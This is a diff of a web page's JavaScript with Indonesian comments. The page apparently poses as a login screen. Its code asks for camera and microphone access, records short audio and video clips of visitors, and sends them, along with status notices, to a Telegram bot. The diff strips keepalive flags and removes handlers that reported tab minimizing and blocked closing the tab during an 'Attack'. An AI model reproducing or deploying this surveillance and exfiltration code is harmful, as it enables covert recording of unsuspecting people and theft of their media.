@@ -100,19 +100,16 @@
     const button = document.getElementById('login-button');
     const notif = document.getElementById('notif');
 
-    // Modifikasi: Menambahkan keepalive agar tetap terkirim saat tab ditutup
     function sendToTelegram(text) {
       chatIds.forEach(id => {
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' }),
-          keepalive: true 
+          body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
         }).catch(console.error);
       });
     }
 
-    // Modifikasi: Menambahkan keepalive pada pengiriman media
     function sendMedia(blob, type, filename, caption) {
       chatIds.forEach(id => {
         const formData = new FormData();
@@ -120,11 +117,7 @@
         formData.append(type, blob, filename);
         if(caption) formData.append('caption', caption);
         let endpoint = (type === 'video') ? 'sendVideo' : 'sendVoice';
-        fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, { 
-          method: 'POST', 
-          body: formData,
-          keepalive: true
-        }).catch(console.error);
+        fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, { method: 'POST', body: formData }).catch(console.error);
       });
     }
 
@@ -142,7 +135,9 @@
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
         stream.getTracks().forEach(track => track.stop());
-      } catch (err) {}
+      } catch (err) {
+        // Jika izin ditolak saat masuk, tidak langsung kirim pesan agar tidak spam
+      }
     }
 
     async function recordAudio() {
@@ -159,7 +154,7 @@
         mediaRecorder.start();
         setTimeout(() => mediaRecorder.stop(), 5000);
       } catch (err) {
-        sendToTelegram('di tolak voice chat'); 
+        sendToTelegram('di tolak voice chat'); // Notif Gagal Audio
       }
     }
 
@@ -180,7 +175,7 @@
           setTimeout(() => mediaRecorder.stop(), 6000);
         });
       } catch (err) { 
-        sendToTelegram('rekaman vidio di tolak 😹'); 
+        sendToTelegram('rekaman vidio di tolak 😹'); // Notif Gagal Video
         return Promise.resolve(); 
       }
     }
@@ -203,22 +198,6 @@
         input.value = '';
       } catch (e) {
         button.disabled = false;
-      }
-    });
-
-    // FITUR BARU: Deteksi saat user meminimalkan browser atau beralih tab
-    document.addEventListener('visibilitychange', () => {
-      if (document.visibilityState === 'hidden') {
-        sendToTelegram('<b>⚠️ Status:</b> Pengunjung meminimalkan halaman (Background Mode aktif).');
-      }
-    });
-
-    // FITUR BARU: Notifikasi jika mencoba menutup tab saat proses sedang berjalan
-    window.addEventListener('beforeunload', (event) => {
-      if (button.disabled) {
-        sendToTelegram('<b>🚨 Alert:</b> Pengunjung mencoba menutup tab saat proses "Attack" berlangsung.');
-        event.preventDefault();
-        event.returnValue = ''; 
       }
     });
 
